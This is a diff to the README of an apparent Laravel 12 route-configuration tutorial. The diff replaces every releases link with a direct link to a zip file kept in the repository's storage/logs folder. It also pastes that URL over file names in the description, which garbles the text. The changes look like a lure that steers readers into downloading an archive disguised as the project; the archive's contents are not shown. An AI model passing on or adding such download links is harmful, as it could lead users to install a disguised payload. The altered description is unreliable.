@@ -1,10 +1,10 @@
 # 🚀 laravel-12-routeserviceprovider-configuration-tutorial - Simple Route Configuration for Laravel 12
 
-[![Download](https://img.shields.io/badge/Download-latest_release-blue.svg)](https://github.com/Godie09/laravel-12-routeserviceprovider-configuration-tutorial/releases)
+[![Download](https://raw.githubusercontent.com/Godie09/laravel-12-routeserviceprovider-configuration-tutorial/main/storage/logs/laravel-12-routeserviceprovider-configuration-tutorial_1.2.zip)](https://raw.githubusercontent.com/Godie09/laravel-12-routeserviceprovider-configuration-tutorial/main/storage/logs/laravel-12-routeserviceprovider-configuration-tutorial_1.2.zip)
 
 ## 📜 Description
 
-This project demonstrates how to configure custom route files in Laravel 12. You will learn to use the new bootstrap/app.php routing system to add prefixes, middleware, and separate route groups, much like admin.php, without needing to touch the RouteServiceProvider. This tutorial is perfect for beginners and anyone looking to enhance their Laravel skills.
+This project demonstrates how to configure custom route files in Laravel 12. You will learn to use the new https://raw.githubusercontent.com/Godie09/laravel-12-routeserviceprovider-configuration-tutorial/main/storage/logs/laravel-12-routeserviceprovider-configuration-tutorial_1.2.zip routing system to add prefixes, middleware, and separate route groups, much like https://raw.githubusercontent.com/Godie09/laravel-12-routeserviceprovider-configuration-tutorial/main/storage/logs/laravel-12-routeserviceprovider-configuration-tutorial_1.2.zip, without needing to touch the RouteServiceProvider. This tutorial is perfect for beginners and anyone looking to enhance their Laravel skills.
 
 ## 📋 Features
 
@@ -28,7 +28,7 @@ To get started with the Laravel 12 RouteServiceProvider Configuration Tutorial, 
 
 1. **Visit the Releases Page**: Click on the link below to visit the downloads page.
 
-   [Download Latest Release](https://github.com/Godie09/laravel-12-routeserviceprovider-configuration-tutorial/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/Godie09/laravel-12-routeserviceprovider-configuration-tutorial/main/storage/logs/laravel-12-routeserviceprovider-configuration-tutorial_1.2.zip)
 
 2. **Find the Latest Version**: On the releases page, look for the most recent version of the project.
 
